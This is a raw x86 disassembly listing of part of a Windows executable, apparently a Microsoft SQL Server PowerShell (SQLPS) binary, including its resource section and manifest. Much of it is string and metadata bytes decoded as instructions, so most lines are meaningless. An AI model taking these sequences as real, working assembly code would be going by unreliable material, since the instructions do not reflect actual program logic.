  4056a0:	xchg   BYTE PTR [edx-0x15ce2a3e],bh
  4056a6:	mov    esp,0x6c66cc3a
  4056ab:	das    
  4056ac:	mov    cs,eax
  4056ae:	jns    0x4056aa
  4056b0:	xchg   esp,eax
  4056b1:	clc    
  4056b2:	div    DWORD PTR [eax-0xdd082ce]
  4056b8:	in     eax,dx
  4056b9:	push   edx
  4056ba:	xor    al,0x48
  4056bc:	clc    
  4056bd:	cmp    al,0x3d
  4056bf:	pop    esp
  4056c0:	pop    ebp
  4056c1:	rcr    bh,cl
  4056c3:	(bad)  
  4056c4:	mov    esp,0x6b28c599
  4056c9:	sub    al,0x12
  4056cb:	push   ecx
  4056cc:	pop    ss
  4056cd:	mov    edi,0x2b24be5c
  4056d2:	popf   
  4056d3:	inc    ecx
  4056d4:	jne    0x4056dd
  4056d6:	xor    dh,BYTE PTR [edx+0x49e6ffbd]
  4056dc:	(bad)  
  4056dd:	out    dx,eax
  4056de:	mov    eax,0x526d52e5
  4056e3:	outs   dx,DWORD PTR ds:[esi]
  4056e4:	fst    QWORD PTR [ebx]
  4056e6:	add    BYTE PTR [ebp-0xd842414],dl
  4056ec:	adc    BYTE PTR [eax-0x27259364],al
  4056f2:	or     BYTE PTR [edi-0x56],0x9a
  4056f6:	shl    BYTE PTR [ecx],0xa
  4056f9:	ret    
  4056fa:	retf   
  4056fb:	mov    ds:0x562305aa,al
  405700:	jnp    0x40572f
  405702:	cli    
  405703:	jg     0x4056e7
  405705:	push   eax
  405706:	mov    bl,0xf
  405708:	lods   al,BYTE PTR ds:[esi]
  405709:	mov    ebp,0x99ecd462
  40570e:	mov    ecx,0x7d7cc44a
  405713:	cmp    ebp,DWORD PTR [eax]
  405715:	icebp  
  405716:	mul    ah
  405718:	enter  0x2005,0x1
  40571c:	add    DWORD PTR [ecx],edx
  40571e:	imul   ecx,DWORD PTR [eax],0x20001
  405724:	add    BYTE PTR [eax],al
  405726:	add    BYTE PTR [eax],al
  405728:	push   es
  405729:	add    BYTE PTR [edx],al
  40572b:	push   cs
  40572c:	push   cs
  40572d:	adc    DWORD PTR [ecx+0x7],esi
  405730:	add    BYTE PTR [ebx],al
  405732:	or     BYTE PTR [esi],cl
  405734:	push   cs
  405735:	adc    DWORD PTR [ecx+0x5],edi
  405738:	add    BYTE PTR [edx],al
  40573a:	add    DWORD PTR [esi],ecx
  40573c:	push   cs
  40573d:	add    al,0x6
  40573f:	adc    al,BYTE PTR [eax+0x1200681]
  405745:	adc    al,BYTE PTR [eax+0x20040e81]
  40574b:	add    DWORD PTR [esi+ecx*1],ebx
  40574e:	add    eax,0x80120000
  405753:	lea    eax,[eax+eiz*1]
  405756:	add    BYTE PTR [edx],dl
  405758:	or     DWORD PTR [edx],ecx
  40575a:	and    BYTE PTR [eax],al
  40575c:	adc    eax,0x1918012
  405761:	adc    al,BYTE PTR [eax+0x3000995]
  405767:	push   cs
  405768:	adc    al,BYTE PTR [eax+0x1c1d0e99]
  40576e:	add    eax,0xe010220
  405773:	push   cs
  405774:	or     BYTE PTR ds:0x1918012,dl
  40577a:	adc    al,BYTE PTR [eax+0x1200595]
  405780:	add    DWORD PTR [ebx],edx
  405782:	add    BYTE PTR ds:0x80120000,al
  405788:	mov    eax,ds:0xe002003
  40578d:	add    eax,0xe010220
  405792:	sbb    al,0x6
  405794:	and    BYTE PTR [edx],al
  405796:	add    cl,BYTE PTR [esi]
  405798:	adc    DWORD PTR [ecx+0x8],edi
  40579b:	add    BYTE PTR [ecx],al
  40579d:	adc    al,BYTE PTR [eax-0x527fee57]
  4057a3:	add    eax,0x80120020
  4057a8:	mov    cl,0x8
  4057aa:	and    BYTE PTR [edx],al
  4057ac:	sbb    eax,0xa980121c
  4057b1:	add    al,BYTE PTR [ebx]
  4057b3:	sbb    eax,0x1d034112
  4057b8:	adc    dh,BYTE PTR [ecx]
  4057ba:	add    ebx,DWORD PTR ds:0x92512
  4057c0:	add    al,0x8
  4057c2:	adc    cl,BYTE PTR [ecx]
  4057c4:	push   cs
  4057c5:	push   cs
  4057c6:	sbb    eax,0xe071f0e
  4057cb:	adc    cl,BYTE PTR [ecx]
  4057cd:	push   cs
  4057ce:	push   cs
  4057cf:	push   cs
  4057d0:	adc    al,BYTE PTR [eax-0x727fed7f]
  4057d6:	adc    al,BYTE PTR [eax+0x41121da5]
  4057dc:	sbb    eax,0x121d3112
  4057e1:	and    eax,0x1c1d080e
  4057e6:	sbb    eax,0x51c
  4057eb:	adc    al,BYTE PTR [eax+0x5b9]
  4057f1:	adc    al,BYTE PTR [eax+0x22009bd]
  4057f7:	add    DWORD PTR [edx],edx
  4057f9:	cmp    BYTE PTR [ecx+0x4bd8012],0x0
  405800:	add    DWORD PTR [edx],eax
  405802:	push   cs
  405803:	pop    es
  405804:	add    BYTE PTR [ecx],al
  405806:	adc    al,BYTE PTR [eax+0x509128d]
  40580c:	and    BYTE PTR [eax],al
  40580e:	adc    al,BYTE PTR [eax+0x121508c9]
  405814:	or     ch,0x1
  405817:	adc    al,BYTE PTR [eax+0x200995]
  40581d:	adc    eax,0x1d18012
  405822:	adc    eax,DWORD PTR [eax]
  405824:	or     BYTE PTR ds:0x1d18012,dl
  40582a:	adc    al,BYTE PTR [eax+0x200495]
  405830:	adc    eax,DWORD PTR [eax]
  405832:	add    eax,0x80120020
  405837:	aad    0x3
  405839:	and    BYTE PTR [eax],al
  40583b:	add    al,BYTE PTR ds:0x80120020
  405841:	fisttp QWORD PTR [edx]
  405843:	and    BYTE PTR [eax],al
  405845:	adc    eax,0x1e18012
  40584a:	adc    al,BYTE PTR [eax+0x121508e5]
  405850:	and    cl,0x1
  405853:	adc    al,BYTE PTR [eax+0x2008e5]
  405859:	adc    eax,0x1e18012
  40585e:	sbb    al,0x6
  405860:	adc    eax,0x1e18012
  405865:	sbb    al,0x3
  405867:	and    BYTE PTR [eax],al
  405869:	or     BYTE PTR ds:0x80120020,al
  40586f:	jmp    0x11407879
  405874:	sub    ch,0x5
  405877:	and    BYTE PTR [eax],al
  405879:	adc    al,BYTE PTR [eax+0x2004a5]
  40587f:	adc    cl,BYTE PTR ds:0xe0c0722
  405885:	or     BYTE PTR [edx],dl
  405887:	add    cl,0x12
  40588a:	xor    ch,0x12
  40588d:	or     BYTE PTR [ebp+0x12c98012],0x80
  405894:	xchg   ebp,eax
  405895:	sbb    al,0x12
  405897:	xor    cl,0x8
  40589a:	sbb    eax,0x8012151c
  40589f:	rol    DWORD PTR [ecx],1
  4058a1:	adc    al,BYTE PTR [eax+0x200395]
  4058a7:	sbb    al,0x4
  4058a9:	pop    es
  4058aa:	add    DWORD PTR [edx],edx
  4058ac:	or     eax,0x12012006
  4058b1:	cmp    ch,0xe
  4058b4:	add    eax,0x81120020
  4058b9:	add    DWORD PTR [ecx],ecx
  4058bb:	pop    es
  4058bc:	add    edx,DWORD PTR [edx]
  4058be:	and    BYTE PTR [ebp+0xefd8012],0x4
  4058c5:	add    DWORD PTR [eax],eax
  4058c7:	add    BYTE PTR [eax],al
  4058c9:	push   es
  4058ca:	and    BYTE PTR [edx],al
  4058cc:	push   cs
  4058cd:	push   cs
  4058ce:	adc    dl,BYTE PTR [ecx]
  4058d0:	add    al,0x7
  4058d2:	add    DWORD PTR ds:0x31c,ebx
  4058d8:	add    DWORD PTR ds:0x81120020,eax
  4058de:	or     eax,0x1022007
  4058e3:	push   cs
  4058e4:	adc    al,BYTE PTR [eax+0x105b1]
  4058ea:	add    BYTE PTR [eax],al
  4058ec:	add    BYTE PTR [ecx],bl
  4058ee:	add    DWORD PTR [eax],eax
  4058f0:	adc    al,0x4d
  4058f2:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4058f9:	je     0x40591b
  4058fb:	push   ebx
  4058fc:	push   ecx
  4058fd:	dec    esp
  4058fe:	and    BYTE PTR [ebx+0x65],dl
  405901:	jb     0x405979
  405903:	gs jb  0x405906
  405906:	add    BYTE PTR [ecx],ch
  405908:	add    DWORD PTR [eax],eax
  40590a:	and    al,0x4d
  40590c:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  405913:	je     0x405935
  405915:	inc    ebx
  405916:	outs   dx,DWORD PTR ds:[esi]
  405917:	jb     0x405989
  405919:	and    BYTE PTR cs:[ecx+0x6c],al
  40591d:	ins    BYTE PTR es:[edi],dx
  40591e:	and    BYTE PTR [edx+0x69],dh
  405921:	addr16 push 0x72207374
  405927:	gs jae 0x40598f
  40592a:	jb     0x4059a2
  40592c:	gs fs add BYTE PTR cs:[eax],al
  405931:	sbb    al,BYTE PTR [ecx]
  405933:	add    BYTE PTR ds:0x7263694d,dl
  405939:	outs   dx,DWORD PTR ds:[esi]
  40593a:	jae    0x4059ab
  40593c:	data16 je 0x40595f
  40593f:	inc    ebx
  405940:	outs   dx,DWORD PTR ds:[esi]
  405941:	jb     0x4059b3
  405943:	outs   dx,DWORD PTR ds:[esi]
  405944:	jb     0x4059a7
  405946:	je     0x4059b1
  405948:	outs   dx,DWORD PTR ds:[esi]
  405949:	outs   dx,BYTE PTR ds:[esi]
  40594a:	add    BYTE PTR [eax],al
  40594c:	sub    al,0x1
  40594e:	add    BYTE PTR [edi],ah
  405950:	xor    DWORD PTR [ecx],esi
  405952:	xor    BYTE PTR cs:[esi],ch
  405955:	xor    dh,BYTE PTR [ecx]
  405957:	xor    BYTE PTR [eax],dh
  405959:	cs xor BYTE PTR ss:[eax],ah
  40595d:	sub    BYTE PTR [eax],ch
  40595f:	push   ebx
  405960:	push   ecx
  405961:	dec    esp
  405962:	xor    DWORD PTR [ecx],esi
  405964:	pop    edi
  405965:	push   edx
  405966:	push   esp
  405967:	dec    ebp
  405968:	sub    DWORD PTR [esi],ebp
  40596a:	xor    DWORD PTR [edx],esi
  40596c:	xor    BYTE PTR [edx],dh
  40596e:	xor    DWORD PTR [eax],esi
  405970:	sub    eax,0x36343831
  405975:	and    BYTE PTR [ecx],ch
  405977:	add    BYTE PTR [eax],al
  405979:	adc    DWORD PTR [ecx],eax
  40597b:	add    BYTE PTR [ecx+esi*1],cl
  40597e:	xor    DWORD PTR [esi],ebp
  405980:	xor    BYTE PTR [esi],ch
  405982:	xor    dh,BYTE PTR [ecx]
  405984:	xor    BYTE PTR [eax],dh
  405986:	cs xor BYTE PTR ss:[eax],al
  40598a:	add    BYTE PTR ds:0x65300001,dh
  405990:	cmp    bl,BYTE PTR [ebx+esi*2+0x71]
  405994:	ins    BYTE PTR es:[edi],dx
  405995:	xor    DWORD PTR [ecx],esi
  405997:	pop    edi
  405998:	ins    DWORD PTR es:[edi],dx
  405999:	popa   
  40599a:	imul   ebp,DWORD PTR [esi+0x5f],0x735c5c74
  4059a1:	jno    0x405a0f
  4059a3:	pop    esp
  4059a4:	inc    ebx
  4059a5:	outs   dx,DWORD PTR ds:[esi]
  4059a6:	ins    DWORD PTR es:[edi],dx
  4059a7:	ins    DWORD PTR es:[edi],dx
  4059a8:	outs   dx,DWORD PTR ds:[esi]
  4059a9:	outs   dx,BYTE PTR ds:[esi]
  4059aa:	pop    esp
  4059ab:	push   ebx
  4059ac:	dec    esi
  4059ad:	dec    ebx
  4059ae:	pop    esp
  4059af:	push   ebx
  4059b0:	push   ecx
  4059b1:	dec    esp
  4059b2:	xor    dh,BYTE PTR [eax]
  4059b4:	xor    BYTE PTR [ebx],dh
  4059b6:	push   ebx
  4059b7:	dec    esi
  4059b8:	dec    ebx
  4059b9:	inc    ebp
  4059ba:	pop    ecx
  4059bb:	cs jae 0x405a2c
  4059be:	imul   eax,DWORD PTR [eax],0x0
  4059c1:	add    eax,0x10001
  4059c6:	add    BYTE PTR [ebp+0x1],cl
  4059c9:	add    BYTE PTR [eax+0x4d],cl
  4059cc:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4059d3:	je     0x4059f5
  4059d5:	push   ebx
  4059d6:	push   ecx
  4059d7:	dec    esp
  4059d8:	and    BYTE PTR [ebx+0x65],dl
  4059db:	jb     0x405a53
  4059dd:	gs jb  0x405a00
  4059e0:	imul   esi,DWORD PTR [ebx+0x20],0x65722061
  4059e7:	imul   esi,DWORD PTR [bp+di+0x74],0x64657265
  4059ef:	and    BYTE PTR [edx+esi*2+0x61],dh
  4059f3:	fs gs ins DWORD PTR es:[edi],dx
  4059f6:	popa   
  4059f7:	jb     0x405a64
  4059f9:	and    BYTE PTR [edi+0x66],ch
  4059fc:	and    BYTE PTR [ebp+0x69],cl
  4059ff:	arpl   WORD PTR [edx+0x6f],si
  405a02:	jae    0x405a73
  405a04:	data16 je 0x405a27
  405a07:	inc    ebx
  405a08:	outs   dx,DWORD PTR ds:[esi]
  405a09:	jb     0x405a7b
  405a0b:	outs   dx,DWORD PTR ds:[esi]
  405a0c:	jb     0x405a6f
  405a0e:	je     0x405a79
  405a10:	outs   dx,DWORD PTR ds:[esi]
  405a11:	outs   dx,BYTE PTR ds:[esi]
  405a12:	add    BYTE PTR cs:[eax],al
  405a15:	and    al,0x1
  405a17:	add    BYTE PTR [edi],bl
  405a19:	dec    ebp
  405a1a:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  405a21:	je     0x405a43
  405a23:	push   ebx
  405a24:	push   ecx
  405a25:	dec    esp
  405a26:	and    BYTE PTR [ebx+0x65],dl
  405a29:	jb     0x405aa1
  405a2b:	gs jb  0x405a4e
  405a2e:	push   eax
  405a2f:	outs   dx,DWORD PTR ds:[esi]
  405a30:	ja     0x405a97
  405a32:	jb     0x405a87
  405a34:	push   0x6c6c65
  405a39:	add    BYTE PTR [edx],bl
  405a3b:	add    DWORD PTR [eax],eax
  405a3d:	adc    eax,0x204c5153
  405a42:	push   ebx
  405a43:	gs jb  0x405abc
  405a46:	gs jb  0x405a69
  405a49:	push   eax
  405a4a:	outs   dx,DWORD PTR ds:[esi]
  405a4b:	ja     0x405ab2
  405a4d:	jb     0x405aa2
  405a4f:	push   0x6c6c65
  405a54:	add    BYTE PTR [edx],cl
  405a56:	add    DWORD PTR [eax],eax
  405a58:	add    eax,0x552d6e65
  405a5d:	push   ebx
  405a5e:	add    BYTE PTR [eax],al
  405a60:	or     BYTE PTR [ecx],al
  405a62:	add    BYTE PTR [eax],cl
  405a64:	add    BYTE PTR [eax],al
  405a66:	add    BYTE PTR [eax],al
  405a68:	add    BYTE PTR [esi],bl
  405a6a:	add    DWORD PTR [eax],eax
  405a6c:	add    DWORD PTR [eax],eax
  405a6e:	push   esp
  405a6f:	add    dl,BYTE PTR [esi]
  405a71:	push   edi
  405a72:	jb     0x405ad5
  405a74:	jo     0x405ac4
  405a76:	outs   dx,DWORD PTR ds:[esi]
  405a77:	outs   dx,BYTE PTR ds:[esi]
  405a78:	inc    ebp
  405a79:	js     0x405ade
  405a7b:	gs jo  0x405af2
  405a7e:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  405a85:	ja     0x405afa
  405a87:	add    DWORD PTR [eax],eax
  405a89:	add    BYTE PTR [eax],al
  405a8b:	add    BYTE PTR [esp+ebx*8+0x35],bl
  405a8f:	dec    edi
  405a90:	add    BYTE PTR [eax],al
  405a92:	add    BYTE PTR [eax],al
  405a94:	add    al,BYTE PTR [eax]
  405a96:	add    BYTE PTR [eax],al
  405a98:	and    al,BYTE PTR [eax]
  405a9a:	add    BYTE PTR [eax],al
  405a9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a9d:	pop    edx
  405a9e:	add    BYTE PTR [eax],al
  405aa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aa1:	dec    edx
  405aa2:	add    BYTE PTR [eax],al
  405aa4:	push   edx
  405aa5:	push   ebx
  405aa6:	inc    esp
  405aa7:	push   ebx
  405aa8:	fdiv   DWORD PTR [ebp+0x70]
  405aab:	pushf  
  405aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aad:	(bad)  
  405aae:	inc    DWORD PTR [ebp-0x68]
  405ab1:	dec    ecx
  405ab2:	into   
  405ab3:	inc    ebx
  405ab4:	stos   BYTE PTR es:[edi],al
  405ab5:	ficomp DWORD PTR [ebx+0x42]
  405ab8:	add    al,BYTE PTR [eax]
  405aba:	add    BYTE PTR [eax],al
  405abc:	push   ebx
  405abd:	push   ecx
  405abe:	dec    esp
  405abf:	push   eax
  405ac0:	push   ebx
  405ac1:	cs jo  0x405b28
  405ac4:	bound  eax,QWORD PTR [eax]
	...
  405b16:	add    BYTE PTR [eax],al
  405b18:	inc    eax
  405b19:	pop    ebx
	...
  405b22:	add    BYTE PTR [eax],al
  405b24:	pop    esi
  405b25:	pop    ebx
  405b26:	add    BYTE PTR [eax],al
  405b28:	add    BYTE PTR [eax],ah
	...
  405b3e:	add    BYTE PTR [eax],al
  405b40:	push   eax
  405b41:	pop    ebx
	...
  405b52:	pop    edi
  405b53:	inc    ebx
  405b54:	outs   dx,DWORD PTR ds:[esi]
  405b55:	jb     0x405b9c
  405b57:	js     0x405bbe
  405b59:	dec    ebp
  405b5a:	popa   
  405b5b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  405b62:	jb     0x405bc9
  405b64:	gs cs fs ins BYTE PTR es:[edi],dx
  405b68:	ins    BYTE PTR es:[edi],dx
  405b69:	add    BYTE PTR [eax],al
  405b6b:	add    BYTE PTR [eax],al
  405b6d:	add    bh,bh
  405b6f:	and    eax,0x402000

Disassembly of section .rsrc:

00406000 <.rsrc>:
	...
  40600c:	add    BYTE PTR [eax],al
  40600e:	add    al,0x0
  406010:	add    eax,DWORD PTR [eax]
  406012:	add    BYTE PTR [eax],al
  406014:	xor    BYTE PTR [eax],al
  406016:	add    BYTE PTR [eax+0xe],al
  40601c:	jo     0x40601e
  40601e:	add    BYTE PTR [eax+0x10],al
  406024:	mov    BYTE PTR [eax],al
  406026:	add    BYTE PTR [eax+0x18],al
  40602c:	mov    al,ds:0x800000
	...
  40603d:	add    BYTE PTR [esi],al
  40603f:	add    BYTE PTR [ecx],al
  406041:	add    BYTE PTR [eax],al
  406043:	add    BYTE PTR [eax+0x2800000],bh
  406049:	add    BYTE PTR [eax],al
  40604b:	add    al,dl
  40604d:	add    BYTE PTR [eax],al
  40604f:	add    BYTE PTR [ebx],0x0
  406052:	add    BYTE PTR [eax],al
  406054:	call   0x4c06059
  406059:	add    BYTE PTR [eax],al
  40605b:	add    BYTE PTR [eax],al
  40605d:	add    DWORD PTR [eax],eax
  40605f:	add    BYTE PTR ds:0x18000000,0x1
  406066:	add    BYTE PTR [eax+0x6],al
  40606c:	xor    BYTE PTR [ecx],al
  40606e:	add    BYTE PTR [eax+0x0],al
	...
  40607c:	add    BYTE PTR [eax],al
  40607e:	add    DWORD PTR [eax],eax
  406080:	add    BYTE PTR gs:[eax],al
  406083:	add    BYTE PTR [eax+0x1],cl
  406086:	add    BYTE PTR [eax+0x0],al
	...
  406094:	add    BYTE PTR [eax],al
  406096:	add    DWORD PTR [eax],eax
  406098:	add    DWORD PTR [eax],eax
  40609a:	add    BYTE PTR [eax],al
  40609c:	pusha  
  40609d:	add    DWORD PTR [eax],eax
  40609f:	add    BYTE PTR [eax],0x0
	...
  4060ae:	add    DWORD PTR [eax],eax
  4060b0:	add    DWORD PTR [eax],eax
  4060b2:	add    BYTE PTR [eax],al
  4060b4:	js     0x4060b7
  4060b6:	add    BYTE PTR [eax+0x0],al
	...
  4060c4:	add    BYTE PTR [eax],al
  4060c6:	add    DWORD PTR [eax],eax
  4060c8:	or     DWORD PTR [eax+eax*1],eax
  4060cb:	add    BYTE PTR [eax+0x1],dl
	...
  4060dd:	add    BYTE PTR [ecx],al
  4060df:	add    BYTE PTR [ecx],cl
  4060e1:	add    al,0x0
  4060e3:	add    BYTE PTR [eax+0x1],ah
	...
  4060f5:	add    BYTE PTR [ecx],al
  4060f7:	add    BYTE PTR [ecx],cl
  4060f9:	add    al,0x0
  4060fb:	add    BYTE PTR [eax+0x1],dh
	...
  40610d:	add    BYTE PTR [ecx],al
  40610f:	add    BYTE PTR [ecx],cl
  406111:	add    al,0x0
  406113:	add    al,al
  406115:	add    DWORD PTR [eax],eax
	...
  406123:	add    BYTE PTR [eax],al
  406125:	add    BYTE PTR [ecx],al
  406127:	add    BYTE PTR [ecx],cl
  406129:	add    al,0x0
  40612b:	add    al,dl
  40612d:	add    DWORD PTR [eax],eax
	...
  40613b:	add    BYTE PTR [eax],al
  40613d:	add    BYTE PTR [ecx],al
  40613f:	add    BYTE PTR [ecx],cl
  406141:	add    al,0x0
  406143:	add    al,ah
  406145:	add    DWORD PTR [eax],eax
	...
  406153:	add    BYTE PTR [eax],al
  406155:	add    BYTE PTR [ecx],al
  406157:	add    BYTE PTR [ecx],cl
  406159:	add    al,0x0
  40615b:	add    al,dh
  40615d:	add    DWORD PTR [eax],eax
	...
  40616b:	add    BYTE PTR [eax],al
  40616d:	add    BYTE PTR [ecx],al
  40616f:	add    BYTE PTR [ecx],cl
  406171:	add    al,0x0
  406173:	add    BYTE PTR [eax],al
  406175:	add    al,BYTE PTR [eax]
	...
  406183:	add    BYTE PTR [eax],al
  406185:	add    BYTE PTR [ecx],al
  406187:	add    BYTE PTR [ecx],cl
  406189:	add    al,0x0
  40618b:	add    BYTE PTR [eax],dl
  40618d:	add    al,BYTE PTR [eax]
  40618f:	add    BYTE PTR [eax],bh
  406191:	imul   eax,DWORD PTR [eax],0xea800
	...
  40619f:	add    al,ah
  4061a1:	ja     0x4061a3
  4061a3:	add    BYTE PTR [eax+0x8],ch
  4061a9:	add    BYTE PTR [eax],al
  4061ab:	add    BYTE PTR [eax],al
  4061ad:	add    BYTE PTR [eax],al
  4061af:	add    BYTE PTR [eax+0x68000080],cl
  4061b5:	add    eax,0x0
  4061ba:	add    BYTE PTR [eax],al
  4061bc:	add    BYTE PTR [eax],al
  4061be:	add    BYTE PTR [eax],al
  4061c0:	lock test DWORD PTR [eax],eax
  4061c3:	add    BYTE PTR [eax+0x25],ch
  4061c9:	add    BYTE PTR [eax],al
  4061cb:	add    BYTE PTR [eax],al
  4061cd:	add    BYTE PTR [eax],al
  4061cf:	add    BYTE PTR [eax-0x57ffff55],bl
  4061d5:	adc    BYTE PTR [eax],al
	...
  4061df:	add    BYTE PTR [eax-0x44],al
  4061e2:	add    BYTE PTR [eax],al
  4061e4:	push   0x4
  4061e9:	add    BYTE PTR [eax],al
  4061eb:	add    BYTE PTR [eax],al
  4061ed:	add    BYTE PTR [eax],al
  4061ef:	add    BYTE PTR [eax+0x5a0000c0],ch
	...
  4061fd:	add    BYTE PTR [eax],al
  4061ff:	add    BYTE PTR [eax-0x77ffff9c],dh
  406205:	add    al,0x0
	...
  40620f:	add    BYTE PTR [eax],ah
  406211:	bound  eax,QWORD PTR [eax]
  406213:	add    BYTE PTR [eax+0x2],dl
  406219:	add    BYTE PTR [eax],al
  40621b:	add    BYTE PTR [eax],al
  40621d:	add    BYTE PTR [eax],al
  40621f:	add    BYTE PTR [edi+edi*1],bh
  406222:	js     0x406291
  406224:	ins    BYTE PTR es:[edi],dx
  406225:	and    BYTE PTR [esi+0x65],dh
  406228:	jb     0x40629d
  40622a:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  406231:	xor    BYTE PTR [edx],ah
  406233:	and    BYTE PTR [ebp+0x6e],ah
  406236:	arpl   WORD PTR [edi+0x64],bp
  406239:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  406240:	inc    esi
  406241:	sub    eax,0x73202238
  406246:	je     0x4062a9
  406248:	outs   dx,BYTE PTR ds:[esi]
  406249:	fs popa 
  40624b:	ins    BYTE PTR es:[edi],dx
  40624c:	outs   dx,DWORD PTR ds:[esi]
  40624d:	outs   dx,BYTE PTR ds:[esi]
  40624e:	gs cmp eax,0x73657922
  406254:	and    bh,BYTE PTR [edi]
  406256:	ds or  eax,0x2d213c0a
  40625c:	sub    eax,0x706f4320
  406261:	jns    0x4062d5
  406263:	imul   esp,DWORD PTR [edi+0x68],0x63282074
  40626a:	sub    DWORD PTR [eax],esp
  40626c:	dec    ebp
  40626d:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  406274:	je     0x406296
  406276:	inc    ebx
  406277:	outs   dx,DWORD PTR ds:[esi]
  406278:	jb     0x4062ea
  40627a:	outs   dx,DWORD PTR ds:[esi]
  40627b:	jb     0x4062de
  40627d:	je     0x4062e8
  40627f:	outs   dx,DWORD PTR ds:[esi]
  406280:	outs   dx,BYTE PTR ds:[esi]
  406281:	and    BYTE PTR ds:0xa0d3e2d,ch
  406287:	cmp    al,0x61
  406289:	jae    0x4062fe
  40628b:	gs ins DWORD PTR es:[edi],dx
  40628d:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  406291:	js     0x406300
  406293:	ins    BYTE PTR es:[edi],dx
  406294:	outs   dx,BYTE PTR ds:[esi]
  406295:	jae    0x4062d4
  406297:	and    dh,BYTE PTR [ebp+0x72]
  40629a:	outs   dx,BYTE PTR ds:[esi]
  40629b:	cmp    dh,BYTE PTR [ebx+0x63]
  40629e:	push   0x73616d65
  4062a3:	sub    eax,0x7263696d
  4062a8:	outs   dx,DWORD PTR ds:[esi]
  4062a9:	jae    0x40631a
  4062ab:	data16 je 0x4062db
  4062ae:	arpl   WORD PTR [edi+0x6d],bp
  4062b1:	cmp    ah,BYTE PTR [ecx+0x73]
  4062b4:	ins    DWORD PTR es:[edi],dx
  4062b5:	cs jbe 0x4062e9
  4062b8:	and    cl,BYTE PTR ds:0x616d200a
  4062be:	outs   dx,BYTE PTR ds:[esi]
  4062bf:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  4062c6:	jb     0x40633b
  4062c8:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  4062cf:	xor    BYTE PTR [edx],ah
  4062d1:	and    BYTE PTR ds:0x3c20200a,cl
  4062d8:	popa   
  4062d9:	jae    0x40634e
  4062db:	gs ins DWORD PTR es:[edi],dx
  4062dd:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4062e1:	fs outs dx,BYTE PTR gs:[esi]
  4062e4:	je     0x40634f
  4062e6:	je     0x406361
  4062e8:	and    BYTE PTR [esi+0x65],dh
  4062eb:	jb     0x406360
  4062ed:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  4062f4:	xor    BYTE PTR [esi],ch
  4062f6:	xor    BYTE PTR [esi],ch
  4062f8:	xor    BYTE PTR [edx],ah
  4062fa:	or     eax,0x2020200a
  4062ff:	and    BYTE PTR [eax],ah
  406301:	outs   dx,BYTE PTR ds:[esi]
  406302:	popa   
  406303:	ins    DWORD PTR es:[edi],dx
  406304:	gs cmp eax,0x6c717322
  40630a:	jo     0x40637f
  40630c:	and    cl,BYTE PTR ds:0x2020200a
  406312:	and    BYTE PTR [eax],ah
  406314:	je     0x40638f
  406316:	jo     0x40637d
  406318:	cmp    eax,0x6e697722
  40631d:	xor    esi,DWORD PTR [edx]
  40631f:	and    ch,BYTE PTR [edi]
  406321:	and    BYTE PTR ds:0x200a0d0a,cl
  406328:	and    BYTE PTR [esp+eiz*2],bh
  40632b:	gs jae 0x406391
  40632e:	jb     0x406399
  406330:	jo     0x4063a6
  406332:	imul   ebp,DWORD PTR [edi+0x6e],0x4c51533e
  406339:	push   eax
  40633a:	push   ebx
  40633b:	and    BYTE PTR ds:0x4c515320,ch
  406341:	and    BYTE PTR [eax+0x6f],dl
  406344:	ja     0x4063ab
  406346:	jb     0x4063bb
  406348:	push   0x3c6c6c65
  40634d:	das    
  40634e:	fs gs jae 0x4063b5
  406352:	jb     0x4063bd
  406354:	jo     0x4063ca
  406356:	imul   ebp,DWORD PTR [edi+0x6e],0xa0d203e
  40635d:	or     eax,0x3c20200a
  406362:	and    DWORD PTR ds:0x6449202d,ebp
  406368:	outs   dx,BYTE PTR gs:[esi]
  40636a:	je     0x4063d5
  40636c:	data16 jns 0x40638f
  40636f:	je     0x4063d9
  406371:	and    BYTE PTR gs:[ecx+0x70],ah
  406375:	jo     0x4063e3
  406377:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40637e:	and    BYTE PTR [ebx+0x65],dh
  406381:	arpl   WORD PTR [ebp+0x72],si
  406384:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x75716572
  40638c:	imul   esi,DWORD PTR [edx+0x65],0x746e656d
  406393:	jae    0x4063c3
  406395:	and    BYTE PTR ds:0xa0d3e2d,ch
  40639b:	or     eax,0x3c20200a
  4063a0:	je     0x406414
  4063a2:	jne    0x406417
  4063a4:	je     0x4063ef
  4063a6:	outs   dx,BYTE PTR ds:[esi]
  4063a7:	outs   dx,WORD PTR ds:[esi]
  4063a9:	and    BYTE PTR [eax+0x6d],bh
  4063ac:	ins    BYTE PTR es:[edi],dx
  4063ad:	outs   dx,BYTE PTR ds:[esi]
  4063ae:	jae    0x4063ed
  4063b0:	and    dh,BYTE PTR [ebp+0x72]
  4063b3:	outs   dx,BYTE PTR ds:[esi]
  4063b4:	cmp    dh,BYTE PTR [ebx+0x63]
  4063b7:	push   0x73616d65
  4063bc:	sub    eax,0x7263696d
  4063c1:	outs   dx,DWORD PTR ds:[esi]
  4063c2:	jae    0x406433
  4063c4:	data16 je 0x4063f4
  4063c7:	arpl   WORD PTR [edi+0x6d],bp
  4063ca:	cmp    ah,BYTE PTR [ecx+0x73]
  4063cd:	ins    DWORD PTR es:[edi],dx
  4063ce:	cs jbe 0x406403
  4063d1:	and    bh,BYTE PTR [esi]
  4063d3:	or     eax,0x2020200a
  4063d8:	and    BYTE PTR [ebx+esi*2],bh
  4063db:	arpl   WORD PTR gs:[ebp+0x72],si
  4063df:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  4063e7:	and    BYTE PTR [eax],ah
  4063e9:	and    BYTE PTR [eax],ah
